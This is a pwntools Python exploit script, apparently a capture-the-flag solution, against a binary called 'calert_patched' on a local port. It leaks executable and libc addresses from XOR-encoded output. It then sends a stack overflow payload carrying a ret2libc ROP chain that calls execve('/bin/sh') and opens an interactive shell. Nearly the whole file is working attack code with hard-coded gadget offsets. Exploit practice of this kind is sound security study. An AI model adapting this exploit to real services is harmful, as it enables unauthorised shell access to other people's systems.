#!/usr/bin/python3

from pwn import *
from binascii import unhexlify, hexlify

libc = ELF('./libc6-amd64_2.31-13_i386.so', checksec=False)
context.binary = exe = ELF('./calert_patched', checksec=False)
context.log_level = 'debug'

# p = process(exe.path)
p = remote('127.0.0.1', 9991)

p.sendlineafter(b'input: ', b'127')
p.sendline(b'A'*7)

key = b'0123456789ABCDEF'
ciphertext = unhexlify(p.recvline()[:-1])
plaintext = xor(ciphertext, key)
print(hexlify(plaintext))

#########################
### Stage 1: Leak exe ###
#########################
exe_leak = u64(plaintext[0x10:0x18])
log.info("Exe leak: " + hex(exe_leak))
exe.address = exe_leak - 0x2038
log.info("Exe base: " + hex(exe.address))

##########################
### Stage 2: Leak libc ###
##########################
libc_leak = u64(plaintext[0x8:0x10])
log.info("Libc leak: " + hex(libc_leak))
libc.address = libc_leak - 0xeef84
log.info("Libc base: " + hex(libc.address))

#################################
### Stage 3: Conduct ret2libc ###
#################################
pop_rdi = exe.address + 0x0000000000001703
pop_rsi_r15 = exe.address + 0x0000000000001701
libc_pop_rdx = libc.address + 0x00000000000cb1cd

p.sendlineafter(b'input: ', b'127')
p.sendline(b'B'*(0x80-2))

p.sendlineafter(b'input: ', b'-1')
payload = b'A'*0x118
payload += flat(
    pop_rdi, next(libc.search(b'/bin/sh')),
    pop_rsi_r15, 0, 0,
    libc_pop_rdx, 0,
    libc.sym['execve']
    )
payload = payload.ljust(0x978, b'A')
p.sendline(payload)

p.interactive()